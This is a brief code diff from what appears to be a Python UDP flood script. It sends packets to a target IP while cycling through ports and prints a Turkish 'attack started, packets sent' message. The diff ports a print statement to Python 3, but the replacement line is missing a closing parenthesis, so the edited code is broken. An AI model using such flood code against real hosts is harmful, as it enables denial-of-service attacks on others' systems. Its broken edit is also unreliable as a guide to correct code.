@@ -51,6 +51,6 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Saldırı %s Başlatıldı %s Gönderilen Paket:%s"%(sent,ip,port)
+     print("Saldırı %s Başlatıldı %s Gönderilen Paket:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
